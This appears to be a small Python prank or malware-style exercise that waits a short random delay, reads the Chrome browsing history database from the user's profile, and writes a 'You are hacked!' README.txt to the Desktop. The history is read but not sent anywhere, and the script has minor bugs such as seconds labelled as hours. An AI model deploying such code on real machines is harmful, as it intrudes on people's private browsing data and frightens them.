import os
import sqlite3
from time import sleep
from random import randrange

USER_PATH = os.environ['USERPROFILE']
HACKER_FILENAME = "README.txt"


def delay_action():
    n_hours = randrange(1, 4)
    print(f"Sleep {n_hours} hours")
    sleep(n_hours)


def create_hacker_file():
    desktop_path = f"{USER_PATH}\\Desktop\\{HACKER_FILENAME}"
    with open(desktop_path, "w") as file:
        urls = get_chrome_history()
        file.write("You are hacked! ")


def get_chrome_history():
    try:
        history_path = f"{USER_PATH}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\history"
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        return urls
        conn.close()
    except sqlite3.OperationalError:
        print("Database is locked")
        return []


def main():
    delay_action()
    create_hacker_file()


if __name__ == "__main__":
    main()
